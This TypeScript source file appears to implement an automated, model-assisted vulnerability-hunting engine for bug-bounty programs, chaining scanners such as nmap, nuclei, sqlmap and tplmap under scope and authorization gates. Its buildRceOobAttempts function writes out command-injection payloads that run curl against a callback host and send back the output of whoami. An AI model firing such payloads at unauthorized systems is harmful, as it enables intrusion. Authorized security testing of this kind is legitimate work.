/**
 * Hunter Engine
 * Unified reasoning-driven scanner replacing traditional tool-chaining.
 * Implements: Observe → Hypothesize → Probe → Update reasoning loop.
 * Features: Anomaly-first scanning, real-time strategy adaptation, Tool Knowledge System.
 */
import { EventEmitter } from "events";
import { execFile } from "child_process";
import { promisify } from "util";
import { scopedHttp } from "../lib/net/scoped-http";
import { v4 as uuidv4 } from "uuid";
import { db } from "../db";
import { huntSessions, findings, exploitChains, customTools, campaigns } from "../db/schema";
import { eq, isNotNull, desc } from "drizzle-orm";
import logger from "../utils/logger";
import { contextWriter } from "../lib/context-writer";
import IntelligenceSynthesizer, { type UnifiedIntelligence, EvasionLibrary, checkWafBypassAuthorization } from "./WAFBypass";
import { ScopeGuard } from "../middleware/scopeGuard";
import { coreGovernance } from "../governance";
import { ModelRouter, ClaudeUnavailableError } from "../intelligence/ModelRouter";
import ROIModel from "../intelligence/ROIModel";
import { promptKB } from "../intelligence/PromptKnowledgeBase";
import { toolKnowledge } from "../lib/hunter/tool-knowledge";
import { ReinforcementWiring } from "../lib/hunter/reinforcement-wiring";
import { jsonPromptLoader } from "../intelligence/JsonPromptLoader";
import { stealthCoordinator, dynamicRateLimiter, autoAdjuster, toolRunner } from "../lib/stealth";
import { egressAllocator } from "../lib/stealth/egress-route-allocator";
import { temporalDecay } from "../lib/hunter/temporal-decay";
import { huntCortex } from "../lib/intelligence/hunt-cortex";
import { metaReasoner } from "../lib/intelligence/meta-reasoning";
import { backwardPlanner } from "../lib/intelligence/backward-planner";
import { observationCompressor } from "../lib/intelligence/observation-compressor";
import { nvdClient } from "../lib/intelligence/nvd-client";
import { sessionManager, AuthConfig } from "../lib/tools/session-manager";
import { callbackServer } from "../lib/oob/callback-server";
import { interactshManager } from "../lib/oob/interactsh-manager";
import { graphqlProber } from "../lib/tools/graphql-probe";
import { ssrfChainProber } from "../lib/tools/ssrf-chain-prober";
import { payloadMutator } from "../lib/tools/payload-mutator";
import { classifyRetryFailure, type RetryFailureReason } from "../lib/tools/retry-failure-classifier";
import { changeDetector } from "../lib/tools/change-detector";
import { secretScanner } from "../lib/tools/secret-scanner";
import { errorDisclosureProber } from "../lib/tools/error-disclosure-prober";
import { notificationService } from "../lib/services/notification-service";
import { webSocketProber } from "../lib/tools/websocket-probe";
import { cloudBucketProber } from "../lib/tools/cloud-bucket-probe";
import { prototypePollutionProber } from "../lib/tools/prototype-pollution-probe";
import { raceConditionDetector } from "../lib/tools/race-condition-detector";
import { hostHeaderProber } from "../lib/tools/host-header-probe";
import { crlfProber } from "../lib/tools/crlf-probe";
import { cookieFlagChecker } from "../lib/tools/cookie-flag-checker";
import { jsSPACrawler, deepCrawl } from "../lib/tools/js-spa-crawler";
import { ATTACK_TREES } from "../intelligence/ExploitChain";
import { writeFile } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";
import { programs } from "../db/schema";
import { parameterDiscovery } from "../lib/tools/parameter-discovery";
import { parseNucleiOutput } from "../lib/parsers/nuclei-parser";
import { failurePrediction } from "../lib/intelligence/failure-prediction";
import { effortScaler, isHigherTier } from "../lib/intelligence/effort-scaling";
import { oauthProber } from "../lib/tools/oauth-probe";
import { massAssignmentProber } from "../lib/tools/mass-assignment-probe";
import { businessLogicProber } from "../lib/tools/business-logic-probe";
import { twoFactorBypassProber } from "../lib/tools/two-factor-bypass";
import { jwtConfusionProber } from "../lib/tools/jwt-confusion-probe";
import { techPayloadSelector } from "../lib/tools/tech-payload-selector";
import { techPayloadProber, isDispatchedByTechPayloadProber } from "../lib/tools/tech-payload-prober";
import { openRedirectChainProber } from "../lib/tools/open-redirect-chain-probe";
import { blindXXEProber } from "../lib/tools/blind-xxe-probe";
import { deserializationProber } from "../lib/tools/deserialization-prober";
import { fileUploadWebshellProber } from "../lib/tools/file-upload-webshell-prober";
import { blindCommandInjectionProber } from "../lib/tools/blind-command-injection-prober";
import { postExploitAgent } from "./PostExploitAgent";
import { zapScanner } from "../lib/tools/zap-scanner";
import { ReconRunner, ReconContext } from "../lib/recon/recon-runner";
import { ClaudeClient } from "../lib/claude-client";
import { synthesisAgent } from "./SynthesisAgent";
import { logicExploitAgent } from "./LogicExploitAgent";
import { normalizeVulnClass, CANONICAL_VULN_CLASSES } from "../lib/vuln-taxonomy";

const execFileAsync = promisify(execFile);

// ─── CVE seeding helpers ──────────────────────────────────────────────────────

const CVE_SEED_ALLOWLIST = new Set([
  "apache", "nginx", "iis", "lighttpd", "litespeed", "tomcat",
  "wordpress", "drupal", "joomla", "magento",
  "php", "node", "ruby", "python", "java",
  "openssl", "mod_ssl", "openssh",
  "mysql", "postgres", "mongodb", "redis",
  "jenkins", "gitlab", "grafana", "kibana",
  "spring", "struts", "rails",
  "weblogic", "websphere", "jboss",
]);

const CVE_SEED_BLOCKLIST = new Set([
  "jquery", "bootstrap", "angular", "react", "vue", "lodash", "underscore",
  "google analytics", "gtag", "cloudflare", "fastly", "cloudfront", "akamai",
  "font awesome", "moment",
]);

const CWE_TO_VULN_CLASS: Record<number, string> = {
  79: "xss", 89: "sqli", 22: "lfi", 78: "rce", 918: "ssrf",
  639: "idor", 287: "auth_bypass", 352: "csrf", 611: "xxe",
  942: "cors", 601: "open_redirect", 200: "info_disclosure", 16: "misconfig",
};

// ─── Types ────────────────────────────────────────────────────────────────────
export interface Observation {
  id: string;
  timestamp: number;
  source: string;  // tool name
  data: Record<string, unknown>;
  anomalyScore: number;
  tags: string[];
}

export interface Hypothesis {
  id: string;
  vulnClass: string;
  targetUrl: string;
  reasoning: string;
  confidence: number;
  priority: number;
  evidence: Observation[];
  // "rejected" means a real probe ran and the evidence didn't support the
  // hypothesis. "deferred" means it was never probed at all — vetoed by
  // failure-prediction or out of scope. Collapsing these into one status
  // is exactly how "wifi was probed and rejected" turned out to be false:
  // it was deferred, never probed, and the label didn't say so.
  status: "pending" | "probing" | "confirmed" | "rejected" | "inconclusive" | "deferred";
  createdAt: number;
  retryCount?: number;
  toolHint?: string;
  /** Set by update()'s gray-zone branch, consumed (and cleared) by probe()'s
   *  retry branch — decides which retry knob turns: not_injectable sets
   *  toolHint instead of this being consumed for a payload mutation; the
   *  other three reasons leave toolHint unset and route the payload instead.
   *  See retry-failure-classifier.ts. */
  lastFailureReason?: RetryFailureReason;
  /** Set by probe()'s retry branch when a waf_blocked/reflected_not_executed
   *  mutation was applied with a confidently-attributable axis (a real vendor,
   *  or a detected app stack) — consumed by update()'s confirmed/rejected
   *  branches to record the outcome via rlWiring.onRetryTechniqueOutcome(),
   *  then cleared either way. Left unset for not_injectable/no_signal, and
   *  for a degraded waf_blocked retry with no authorized vendor — neither has
   *  a confident axis to attribute a win or loss to. */
  retryTechnique?: { reason: "waf_blocked" | "reflected_not_executed"; axisKey: string; technique: string };
  /** Which model generated this hypothesis — used to score model performance in RL store. */
  modelSource?: "claude" | "default";
  /** Finding IDs this hypothesis chains from (set by SynthesisAgent). */
  chainedFrom?: string[];
}

export interface ProbeResult {
  hypothesisId: string;
  tool: string;
  command: string;
  output: string;
  parsed: Record<string, unknown>;
  success: boolean;
  duration: number;
  payload?: string;
  rawHttpLog?: string;
  videoPath?: string;
  oobBeaconId?: string;
  /** True only when this probe's OOB beacon actually fired (not merely attempted).
   *  Distinguishes a real out-of-band hit from a beacon that was planted but never
   *  called back — oobBeaconId is set on both, so it alone cannot mean "confirmed". */
  oobConfirmed?: boolean;
}

export interface HuntState {
  sessionId: string;
  targetUrl: string;
  programId: number;
  phase: "observe" | "hypothesize" | "probe" | "update" | "complete";
  observations: Observation[];
  hypotheses: Hypothesis[];
  probes: ProbeResult[];
  confirmedFindings: HypothesisConfirmed[];
  iteration: number;
  maxIterations: number;
  budget: { maxRequests: number; requestsMade: number; maxTime: number; elapsed: number };
  corpusEnrichment: boolean;
  proxyEnabled: boolean;
  /** User must explicitly opt in per hunt — WAFBypass.synthesize() is skipped
   *  entirely when false, and even when true a program whose wafBypassPolicy is
   *  "disallowed" hard-blocks it (see WAFBypass.ts). */
  wafBypassEnabled: boolean;
  /** Endpoint paths/URLs observed by deepCrawl during observe() — feeds the
   *  post-crawl EffortScaler rescale so complexity reflects what the target
   *  actually exposes, not just the launch string. */
  discoveredEndpoints: string[];
}

export interface HypothesisConfirmed {
  hypothesis: Hypothesis;
  proof: ProbeResult[];
  severity: string;
  cvssScore: number;
  exploitPayload: string;
  rawEvidence?: string;
  videoPath?: string;
  oobBeaconId?: string;
  /** True when one of the confirming probes was validated by a real OOB beacon hit.
   *  Drives findings.oobHitReceived at persist time so the verifier can treat the
   *  callback as an authoritative, non-destructive oracle. */
  oobConfirmed?: boolean;
}

// nuclei -tags filter per hypothesis vuln class. Without a tag (or custom template)
// filter, nuclei runs its entire default template store and always blows past the
// 60s tool timeout. Mapping each class to its nuclei tag(s) keeps each probe to a
// small, relevant subset that returns in seconds. The fallback bounds any unmapped
// class so it can never trigger a full scan.
export const NUCLEI_TAGS_BY_CLASS: Record<string, string> = {
  sqli: "sqli",
  xss: "xss",
  rce: "rce",
  ssrf: "ssrf",
  lfi: "lfi",
  xxe: "xxe",
  cors: "cors",
  open_redirect: "redirect",
  exposed_panels: "panel,exposure",
  info_disclosure: "exposure",
  auth_bypass: "default-login,auth-bypass",
  broken_auth: "default-login,auth-bypass",
  idor: "idor",
  csrf: "csrf",
  misconfig: "misconfig",
  security_headers: "misconfig",
};
// "misconfig,exposure,cve" loaded 5081 templates and always hit the 60s runTool
// ceiling. "misconfig" alone loads ~624 templates and completes in ~10-15s.
const NUCLEI_TAGS_FALLBACK = "misconfig";

// Evidence sources that already ARE a completed, real probe — each of these
// OBSERVE-phase modules builds its hypotheses as a direct map() over its own
// actively-confirmed vulns (see e.g. race-condition-detector.ts: `vulns.map(...)`),
// not a speculative guess that still needs testing. Routing them through the
// generic selectToolRL()/runTool() dispatch in probe() throws that evidence away:
// the tool it lands on (nuclei/curl_probe) either doesn't declare the vuln class
// at all (toolSupportsClass gates it to false — race_condition) or declares an
// unrelated class that happens to string-match (cookie_flag_checker emits
// xss/info_disclosure/csrf, so curl_probe/dalfox "pass" the gate but test
// something the cookie-flag finding never claimed — a missing CSP header, not a
// missing HttpOnly flag). See the SELF_CONFIRMED_SOURCES branch in probe().
// All dedicated OBSERVE-phase probers with a self-confirming source are now
// wired in here.
const SELF_CONFIRMED_SOURCES = new Set(["race_condition_detector", "cookie_flag_checker", "host_header_probe", "oauth_probe", "mass_assignment_probe", "two_factor_bypass_probe", "jwt_confusion_probe", "prototype_pollution_probe", "cloud_bucket_probe", "websocket_probe", "open_redirect_chain_probe", "blind_xxe_probe", "crlf_probe", "deserialization_prober", "file_upload_webshell_prober", "blind_command_injection_prober"]);

// ─── OOB-RCE injection vectors ────────────────────────────────────────────────
// Real command injection usually EMBEDS a param inside a shell command, so the
// payload needs a breakout prefix — not just a raw `curl <cb>`. We fan a bounded
// set of (param × breakout) attempts, all pointing at ONE beacon, each tagged with
// a `v=<vector>` marker so the callback tells us which one fired. whoami/id output
// is folded into the callback query so the beacon captures WHO executed.
const RCE_OOB_PARAMS = ["cmd", "exec", "command", "c", "ping", "host", "ip", "url", "query", "q", "data", "input"];
const MAX_RCE_OOB_ATTEMPTS = 24;

interface RceOobAttempt { method: "GET" | "POST"; url: string; body?: Record<string, string>; }

/**
 * Hard scope-narrowing gate: mutates any "pending" hypothesis whose vulnClass
 * isn't in `allowlist` to "deferred" — excluded from this and every later
 * iteration (not silently dropped, not endlessly re-filtered). A no-op when
 * `allowlist` is empty (unrestricted, the default). Pure/testable — operates
 * on plain hypothesis-shaped objects, no HunterEngine instance required.
 */
export function applyVulnClassAllowlist<T extends { status: string; vulnClass: string }>(
  hypotheses: T[],
  allowlist: string[]
): T[] {
  if (allowlist.length === 0) return [];
  const excluded = hypotheses.filter(h => h.status === "pending" && !allowlist.includes(h.vulnClass));
  for (const h of excluded) h.status = "deferred";
  return excluded;
}

/** Build a bounded set of OOB command-injection attempts against a target, across
 *  common param names and shell-breakout contexts, GET + a few POST. Pure/testable. */
export function buildRceOobAttempts(targetUrl: string, callbackUrl: string): RceOobAttempt[] {
  // Each breakout wraps a callback that exfils whoami and tags the winning vector.
  const cb = (v: string) => `${callbackUrl}?v=${v}&u=$(whoami)`;
  const payloads: string[] = [
    `curl ${cb("raw")}`,          // sink runs the value as a command
    `; curl ${cb("semi")}`,       // ; breakout
    `| curl ${cb("pipe")}`,       // | breakout
    `&& curl ${cb("and")}`,       // && breakout
    `$(curl ${cb("sub")})`,       // command substitution
    "`curl " + cb("tick") + "`",  // backtick substitution
    `\ncurl ${cb("nl")}`,         // newline breakout
  ];

  // Prefer params already present on the URL, then the RCE-common set; dedupe + cap.
  const params = Array.from(new Set([
    ...payloadMutator.findInjectableParams(targetUrl),
    ...RCE_OOB_PARAMS,
  ])).slice(0, 8);

  // Reserve room for a few POST attempts so the GET burst can't consume the whole cap.
  const postParams = params.slice(0, 3);
  const getBudget = MAX_RCE_OOB_ATTEMPTS - postParams.length;

  const attempts: RceOobAttempt[] = [];
  for (const param of params) {
    for (const payload of payloads) {
      if (attempts.length >= getBudget) break;
      attempts.push({ method: "GET", url: payloadMutator.injectPayload(targetUrl, param, payload) });
    }
    if (attempts.length >= getBudget) break;
  }
  // POST (JSON body) for the top params — many sinks are POST-only.
  for (const param of postParams) {
    attempts.push({ method: "POST", url: targetUrl, body: { [param]: `; curl ${cb("post-" + param)}` } });
  }
  return attempts.slice(0, MAX_RCE_OOB_ATTEMPTS);
}

// ─── Tool Knowledge System ────────────────────────────────────────────────────
// Commands return { bin, args } arrays — never interpolated shell strings —
// to prevent command injection via attacker-controlled URLs.
export const TOOL_KNOWLEDGE: Record<string, {
  description: string;
  vulnClasses: string[];
  command: (url: string, opts?: Record<string, string>) => { bin: string; args: string[] };
  parser: (output: string) => Record<string, unknown>;
  rateLimit: number; // seconds between invocations
}> = {
  nmap: {
    description: "Network port scanner and service fingerprinter",
    vulnClasses: ["open_ports", "service_enumeration", "os_detection"],
    command: (url) => {
      // Include the target URL's actual port — real/vibe-coded apps run on arbitrary
      // ports (3000, 5000, 8000, 5173…). The old hardcoded list missed them, so nmap
      // scanned nothing on e.g. localhost:5000.
      const u = new URL(url);
      const ports = Array.from(new Set([u.port, "80", "443", "8080", "8443"].filter(Boolean))).join(",");
      return {
        bin: "nmap",
        args: ["-sV", "-sC", "--script=http-headers,http-title", "-p", ports,
               u.hostname, "--open", "-oX", "-"],
      };
    },
    parser: (output) => {
      const ports: string[] = [];
      const matches = output.match(/portid="(\d+)"[^>]*state="open"/g) || [];
      matches.forEach(m => { const p = m.match(/portid="(\d+)"/); if (p) ports.push(p[1]); });
      return { openPorts: ports, rawOutput: output.slice(0, 2000) };
    },
    rateLimit: 60,
  },
  nuclei: {
    description: "Fast vulnerability scanner with templated probes",
    // Kept in sync with NUCLEI_TAGS_BY_CLASS below — that map is what actually scopes
    // nuclei's templates per hypothesis at dispatch time (runTool), so this list must
    // cover every class nuclei is genuinely tag-scoped for. A class missing here (while
    // present in NUCLEI_TAGS_BY_CLASS) would have its real, content-based nuclei match
    // wrongly discarded by the probe-success gate in probe() — nuclei parses actual
    // template-match JSON (see parseNucleiOutput), unlike curl_probe's header-only
    // heuristic, so its `found` flag is legitimate evidence for all of these.
    vulnClasses: ["xss", "sqli", "rce", "ssrf", "lfi", "xxe", "cors", "open_redirect",
                  "exposed_panels", "info_disclosure", "auth_bypass", "broken_auth",
                  "idor", "csrf", "misconfig", "security_headers"],
    command: (url, opts) => ({
      bin: "nuclei",
      // -disable-update-check: nuclei's periodic template/binary update probe is a
      // network round-trip that can stall (esp. first run of the day). Template
      // selection (-tags by vuln class) is injected in runTool so a fresh hunt
      // doesn't run the full default store and blow past the 60s tool ceiling.
      // -ni: disable Interactsh OOB server — without it nuclei waits for OOB
      // callbacks on every run, adding 7-60s of wait that blows the runTool ceiling.
      args: ["-u", url, "-s", opts?.severity || "medium,high,critical",
             "-j", "-silent", "-disable-update-check", "-timeout", "10", "-ni"],
    }),
    parser: (output) => {
      const result = parseNucleiOutput(output);
      return {
        found: result.found,
        count: result.count,
        findings: result.matches,
        confidence: result.confidence,
        severity: result.highestSeverity,
        flagValues: result.flagValues,
        rawOutput: result.rawOutput,
      };
    },
    rateLimit: 30,
  },
  ffuf: {
    description: "Fast web fuzzer for directory and parameter discovery",
    vulnClasses: ["hidden_endpoints", "backup_files", "admin_panels", "parameter_pollution"],
    command: (url) => ({
      bin: "ffuf",
      // `-s` (silent) prints matched results one per line — ffuf has no `-json` flag
      // (it's `-of json`, which writes a file). Strip a trailing slash so we don't
      // request `//FUZZ` when the target URL ends in `/`.
      args: ["-u", `${url.replace(/\/+$/, "")}/FUZZ`, "-w", "/usr/share/wordlists/dirb/common.txt",
             "-mc", "200,301,302,403", "-t", "50", "-timeout", "5", "-s"],
    }),
    parser: (output) => {
      const paths = output.split("\n").map(l => l.trim()).filter(Boolean);
      return { results: paths, total: paths.length };
    },
    rateLimit: 10,
  },
  sqlmap: {
    description: "Automated SQL injection detection and exploitation",
    vulnClasses: ["sqli", "blind_sqli", "time_based_sqli", "error_based_sqli"],
    command: (url) => ({
      bin: "sqlmap",
      // --crawl=0: test only the given URL/forms, don't wander the site (keeps the
      // run from blowing past the 60s tool ceiling). The breaker remains the backstop.
      args: ["-u", url, "--batch", "--level=2", "--risk=2", "--crawl=0",
             "--timeout=10", "--output-dir=/tmp/sqlmap", "--forms"],
    }),
    parser: (output) => {
      const injectable = /parameter .* is vulnerable|sqlmap identified/.test(output);
      const dbms = output.match(/back-end DBMS: (.+)/)?.[1] || "unknown";
      return { injectable, dbms, output: output.slice(0, 1000) };
    },
    rateLimit: 60,
  },
  whatweb: {
    description: "Web technology fingerprinter",
    vulnClasses: ["tech_stack", "cms_detection", "framework_detection"],
    command: (url) => ({
      bin: "whatweb",
      args: ["--no-errors", "--aggression=3", "--log-json=-", url],
    }),
    parser: (output) => {
      try {
        const data = JSON.parse(output.split("\n").find(l => l.startsWith("[")) || "[]");
        return { technologies: data };
      } catch {
        return { rawOutput: output.slice(0, 500) };
      }
    },
    rateLimit: 5,
  },
  nikto: {
    description: "Web server vulnerability scanner",
    vulnClasses: ["misconfig", "outdated_software", "dangerous_files", "headers"],
    command: (url) => ({
      bin: "nikto",
      // No -Format json: the parser below reads nikto's default TEXT output
      // ("+ ...", "OSVDB-..."), and -Format requires -output (errors without it).
      // -maxtime bounds the run under the 60s tool ceiling.
      args: ["-h", url, "-timeout", "10", "-maxtime", "60"],
    }),
    parser: (output) => {
      const vulns = output.match(/OSVDB-\d+:.+/g) || [];
      const items = output.match(/\+ .+/g) || [];
      return { vulnerabilities: vulns, items: items.slice(0, 20), count: vulns.length };
    },
    rateLimit: 120,
  },
  gobuster: {
    description: "Directory/file brute-forcer",
    vulnClasses: ["hidden_endpoints", "backup_files", "exposed_configs", "exposed_panels"],
    command: (url) => ({
      bin: "gobuster",
      args: ["dir", "-u", url, "-w", "/usr/share/wordlists/dirb/common.txt",
             "-q", "--no-error", "-t", "50", "--timeout", "5s"],
    }),
    parser: (output) => {
      const found = output.match(/\/.+ \(\d+\)/g) || [];
      return { paths: found, count: found.length };
    },
    rateLimit: 30,
  },
  curl_probe: {
    description: "HTTP header and response analysis",
    // csrf/info_disclosure/open_redirect were removed from this list: `found`
    // below is purely a missing-security-header/CORS-wildcard count, which has
    // no bearing on any of those three classes. Declaring them here let
    // toolSupportsClass (probe()) treat that generic signal as confirming
    // evidence for hypotheses it can't actually test — a target simply
    // missing X-Frame-Options/CSP made curl_probe "confirm" csrf,
    // info_disclosure, AND open_redirect hypotheses identically, all from the
    // same header dump. Verified live: a real target missing 2 security
    // headers had all three vuln classes falsely confirmed from that single
    // signal. nuclei remains a real, tag-scoped detector for all three via
    // TOOL_CANDIDATES, so this doesn't remove coverage — only the broken path.
    vulnClasses: ["security_headers", "cors"],
    command: (url) => ({
      bin: "curl",
      // GET (not HEAD): many real apps implement GET but not HEAD and let HEAD
      // hang until --max-time. `-D -` dumps response headers to stdout (same shape
      // the parser reads), `-o /dev/null` discards the body.
      args: ["-s", "-L", "-D", "-", "-o", "/dev/null", "--max-time", "10", url],
    }),
    parser: (output) => {
      const headers: Record<string, string> = {};
      output.split("\n").forEach(line => {
        const m = line.match(/^([^:]+):\s*(.+)/);
        if (m) headers[m[1].toLowerCase().trim()] = m[2].trim();
      });
      const missing: string[] = [];
      const secHeaders = ["content-security-policy", "x-frame-options", "x-content-type-options", "strict-transport-security"];
      secHeaders.forEach(h => { if (!headers[h]) missing.push(h); });
      const corsWild = headers["access-control-allow-origin"] === "*";
      const found = missing.length >= 2 || corsWild;
      return { headers, missingSecurityHeaders: missing, corsWildcard: corsWild, found, count: missing.length, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 1,
  },
  tplmap: {
    description: "Server-side template injection detection and exploitation",
    vulnClasses: ["ssti", "rce"],
    command: (url) => ({
      bin: "tplmap",
      // --level 2 (not 5/max): a first-pass probe that can finish under the 60s
      // ceiling instead of always being killed.
      args: ["-u", url, "--level", "2", "--os-cmd", "id"],
    }),
    parser: (output) => {
      // "Template Injection" alone matched tplmap's own banner — "Automatic
      // Server-Side Template Injection Detection and Exploitation Tool" —
      // which prints on every single run, vulnerable target or not. Verified
      // against /opt/tplmap/core/checks.py: "Tplmap identified the following
      // injection point:" only prints from _print_injection_summary(), which
      // is only reachable when a real template engine was actually detected
      // (the negative path logs "Tested parameters appear to be not
      // injectable." and returns before ever reaching it) — that's the only
      // genuine positive-result marker.
      const found = /Tplmap identified|injection point/i.test(output);
      const engine = output.match(/Template engine: (\w+)/i)?.[1] ?? "unknown";
      return { found, engine, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 30,
  },
  xsstrike: {
    // Overrides the Kali-catalog entry (kali-catalog.ts declares parserType:
    // "lines", HunterEngine's TOOL_KNOWLEDGE wins on name collision) — the
    // "lines" parser treats any non-empty output line as a finding, which for
    // xsstrike means its own banner/progress lines (version banner, "WAF
    // Status: Offline", "Testing parameter: X") always produce found:true,
    // even when the very next line is xsstrike's own negative verdict "No
    // reflection found". Verified live: a real, non-reflecting endpoint
    // still "confirmed" xss this way. xsstrike's actual positive markers
    // (modes/scan.py): logger.good('Potentially vulnerable objects found')
    // and logger.good('Payload: %s') — only printed once a payload actually
    // round-tripped through a real reflection.
    description: "Advanced XSS scanner with mutation engine",
    vulnClasses: ["xss"],
    command: (url) => ({
      bin: "xsstrike",
      args: ["-u", url, "--skip"],
    }),
    parser: (output) => {
      const found = /Potentially vulnerable objects found|Payload:/i.test(output);
      return { found, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 20,
  },
  dalfox: {
    description: "Parameter analysis and XSS scanner",
    vulnClasses: ["xss"],
    command: (url) => ({
      bin: "dalfox",
      // --format json: one JSON object per finding on stdout, same streaming
      // shape the parser below already expected from the old nuclei fallback.
      // --skip-bav skips the slow basic-auth-vuln checks so a first pass stays
      // under the 60s tool ceiling; --timeout bounds each individual request.
      args: ["url", url, "--silence", "--format", "json", "--no-color", "--skip-bav", "--timeout", "10"],
    }),
    parser: (output) => {
      const findings: unknown[] = [];
      output.split("\n").filter(l => l.trim()).forEach(line => {
        try { findings.push(JSON.parse(line)); } catch { /* skip non-JSON banner/log lines */ }
      });
      return { found: findings.length > 0, findings, count: findings.length, rawOutput: output.slice(0, 800) };
    },
    rateLimit: 15,
  },
  jwt_tool: {
    description: "JWT security testing — alg:none, RS/HS confusion, key injection",
    vulnClasses: ["auth_bypass", "jwt_confusion"],
    command: (url) => ({
      bin: "jwt_tool",
      args: ["-t", url, "-M", "at", "-np"],
    }),
    parser: (output) => {
      const vulnerable = /EXPLOIT|Claim misuse|alg: none|RS256.*HS256|Key injection|\[CRITICAL\]/i.test(output);
      const technique = output.match(/(alg: none|RS256.*HS256|[Kk]ey injection)/)?.[1] ?? "";
      return { vulnerable, found: vulnerable, technique, rawOutput: output.slice(0, 600) };
    },
    rateLimit: 20,
  },
  smuggler: {
    description: "HTTP request smuggling detection (CL.TE and TE.CL)",
    vulnClasses: ["http_smuggling"],
    command: (url) => ({
      bin: "smuggler",
      args: ["-u", url, "--no-color"],
    }),
    parser: (output) => {
      const vulnerable = /Issue found|CL\.TE|TE\.CL|TE\.TE/i.test(output);
      const type = output.match(/(CL\.TE|TE\.CL|TE\.TE)/)?.[1] ?? "unknown";
      return { vulnerable, type: vulnerable ? type : null, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 60,
  },
  corsy: {
    description: "CORS misconfiguration scanner — detects all known CORS bypasses",
    vulnClasses: ["cors"],
    command: (url) => ({
      bin: "corsy",
      args: ["-u", url, "-t", "10"],
    }),
    parser: (output) => {
      const found = /CORS misconfiguration|\[FOUND\]|Origin reflection|Null origin|Wildcard/i.test(output);
      const misconfigs = output.match(/\[FOUND\].+/gi) ?? [];
      return { found, misconfigurations: misconfigs, count: misconfigs.length, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 15,
  },
  nosqlmap: {
    description: "NoSQL injection scanner for MongoDB and CouchDB",
    vulnClasses: ["nosqli", "sqli"],
    command: (url) => ({
      bin: "nosqlmap",
      args: ["-u", url, "--attack", "2", "--noInteractive"],
    }),
    parser: (output) => {
      const injectable = /injection found|vulnerable|extracting data/i.test(output);
      const dbms = output.match(/(?:MongoDB|CouchDB|Cassandra)/i)?.[0] ?? "unknown";
      return { injectable, found: injectable, dbms, rawOutput: output.slice(0, 500) };
    },
    rateLimit: 60,
  },
  xsser: {
    description: "Automated XSS detection and exploitation framework",
    vulnClasses: ["xss"],
    command: (url) => ({
      bin: "xsser",
      args: ["--url", url, "--auto", "--silent"],
    }),
    parser: (output) => {
      const found = /XSS FOUND|Total injections: [1-9]/i.test(output);
      const count = parseInt(output.match(/Total injections: (\d+)/i)?.[1] ?? "0", 10);
      return { found, count, rawOutput: output.slice(0, 600) };
    },
    rateLimit: 30,
  },
};

const MAX_OBSERVATIONS = 500;
const MAX_HYPOTHESES = 150;
const MAX_PROBES = 1500;

// Truncation priority for the MAX_HYPOTHESES cap below: "pending"/"probing"
// hypotheses must survive over resolved ones (confirmed/deferred/rejected/
// inconclusive) regardless of raw priority score — a low-priority hypothesis
// that hasn't been tried yet is more valuable to keep than a high-priority one
// that's already deferred/confirmed and will never be revisited (a confirmed
// finding's outcome already lives in confirmedFindings/the DB independent of
// this array). Without this, a hypothesis whose priority score was computed
// BEFORE a vulnClassAllowlist deferred it (e.g. race_condition at priority
// 9 × confidence 0.8 = 7.2) permanently outranks and evicts a lower-priority
// ALLOWED hypothesis (e.g. crlf_injection at priority 7 × confidence
// 0.55-0.8 = 3.85-5.6) on every truncation event, even though the deferred one
// can never be probed again. Confirmed live: crlf_injection never got a
// single hypothesis into the array despite an allowlist explicitly allowing
// it, because higher-scored deferred hypotheses from disallowed classes kept
// winning every truncation pass.
export function truncationRank(h: { status: string; priority: number; confidence: number }): number {
  const actionable = h.status === "pending" || h.status === "probing";
  return (actionable ? 1_000_000 : 0) + h.priority * h.confidence;
}

// seedFocusHypotheses() seeds hypotheses with evidence:[] and a placeholder
// reasoning string ("X is a priority for this hunt") — pure scheduling
// metadata, not a description of anything found. If a probe later actually
// succeeded, this replaces that placeholder before it's used as the confirmed
// finding's description (both in hunt-findings.json and the persisted DB
// row) — otherwise a real underlying finding gets reported with a
// description that just says "this vuln class was a priority," forever.
export function describeFromProbe(
  hypothesis: { evidence: unknown[]; vulnClass: string; targetUrl: string; reasoning: string },
  bestProbe: { tool: string; output: string },
): string {
  if (hypothesis.evidence.length > 0) return hypothesis.reasoning;
  return `${hypothesis.vulnClass} confirmed via ${bestProbe.tool} at ${hypothesis.targetUrl}: ${bestProbe.output.slice(0, 300)}`;
}

// ─── Hunter Engine ────────────────────────────────────────────────────────────
// 5-minute TTL for custom tool cache (shared across all engine instances in a process)
let customToolsCacheTs = 0;
let customToolsCache: typeof TOOL_KNOWLEDGE = {};

// Binary availability cache — populated lazily, valid for the process lifetime
const binaryCache = new Map<string, string | null>();
function checkBinarySync(binary: string): string | null {
  if (binaryCache.has(binary)) return binaryCache.get(binary) ?? null;
  // Only ever resolve plain binary names — reject anything with path separators
  // or shell metacharacters so a malicious catalog/tool name can't reach a shell.
  if (!/^[A-Za-z0-9._-]+$/.test(binary)) {
    binaryCache.set(binary, null);
    return null;
  }
  try {
    const { execFileSync } = require("child_process");
    // execFile with an args array — no shell, stderr discarded via stdio.
    const path = execFileSync("which", [binary], {
      encoding: "utf8",
      timeout: 2000,
      stdio: ["ignore", "pipe", "ignore"],
    }).trim();
    const result = path || null;
    binaryCache.set(binary, result);
    return result;
  } catch {
    binaryCache.set(binary, null);
    return null;
  }
}

/**
 * Build a { bin, args } command from a whitespace-delimited template, safely
 * substituting {url} and {domain} placeholders.
 *
 * The template is tokenized FIRST, then placeholders are replaced within each
 * token. This guarantees the URL stays a single argument even if it contains
 * spaces — preventing argument injection (e.g. a URL like
 * "http://x/ --output=/etc/passwd" can no longer add a flag to the tool).
 * Returns null if the URL is not a safe http(s) URL.
 */
function buildCommandFromTemplate(
  template: string,
  url: string,
): { bin: string; args: string[] } | null {
  let safeUrl: string;
  let domain: string;
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    safeUrl = u.toString();
    domain = u.hostname;
  } catch {
    return null;
  }
  const tokens = template.split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;
  const substituted = tokens.map(tok =>
    tok.replace(/\{url\}/g, safeUrl).replace(/\{domain\}/g, domain)
  );
  return { bin: substituted[0], args: substituted.slice(1) };
}

function makeCustomParser(parserType: string): (output: string) => Record<string, unknown> {
  if (parserType === "json") {
    return (out) => { try { return JSON.parse(out) as Record<string, unknown>; } catch { return { output: out }; } };
